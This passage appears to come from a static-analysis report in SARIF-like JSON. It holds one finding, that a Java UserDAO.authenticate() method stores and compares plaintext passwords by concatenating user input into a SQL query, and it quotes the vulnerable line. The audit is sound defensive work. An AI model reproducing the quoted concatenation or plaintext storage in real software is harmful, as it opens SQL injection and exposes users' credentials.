          "ruleId": "password-management",
          "level": "error",
          "message": {
            "text": "UserDAO.authenticate() compares passwords in the SQL query by matching the user's supplied cleartext string directly against the password column:\n\n\"… AND password = '\" + password + \"'\"\n\nThe database schema (V1init.sql) confirms the column is a plain VARCHAR(255) storing literal plaintext passwords ('admin', 'eddy', 'john'). Password hashing is entirely absent. Consequences:\nDatabase breach → instant credential disclosure: Any SQL injection (see separate findings), database backup leak, or insider threat immediately exposes all user passwords in plaintext.\nCredential stuffing: Because many users reuse passwords, a dump of this database allows attacks against users' accounts on other services.\nNo brute-force resistance: Without a work-factor (e.g., bcrypt cost), offline cracking is near-instantaneous.",
            "markdown": "\n`UserDAO.authenticate()` compares passwords in the SQL query by matching the user's supplied cleartext string directly against the `password` column:\n\n```java\n\"… AND password = '\" + password + \"'\"\n```\n\nThe database schema (`V1__init.sql`) confirms the column is a plain `VARCHAR(255)` storing literal plaintext passwords (`'admin'`, `'eddy'`, `'john'`). Password hashing is entirely absent. Consequences:\n\n1. **Database breach → instant credential disclosure**: Any SQL injection (see separate findings), database backup leak, or insider threat immediately exposes all user passwords in plaintext.\n2. **Credential stuffing**: Because many users reuse passwords, a dump of this database allows attacks against users' accounts on other services.\n3. **No brute-force resistance**: Without a work-factor (e.g., bcrypt cost), offline cracking is near-instantaneous.\n"
          },
